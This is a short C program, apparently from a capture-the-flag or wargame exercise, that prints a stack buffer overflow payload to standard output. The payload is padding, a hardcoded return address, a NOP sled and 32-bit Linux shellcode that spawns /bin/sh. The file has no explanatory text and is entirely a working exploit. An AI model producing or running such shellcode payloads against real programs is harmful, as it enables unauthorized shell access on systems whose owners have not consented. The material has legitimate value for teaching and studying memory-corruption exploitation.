#include <unistd.h>
#include <string.h>

#define FIRST "********************\n"

#define PADDING 	"AAAABBBBC"
#define ADDR		"\xc9\xe5\xff\xbf"
#define NOPSLIDE	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
#define SHELLCODE	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

#define SECOND PADDING ADDR NOPSLIDE SHELLCODE "\n"

int main() {
	write(1, SECOND, strlen(SECOND));
}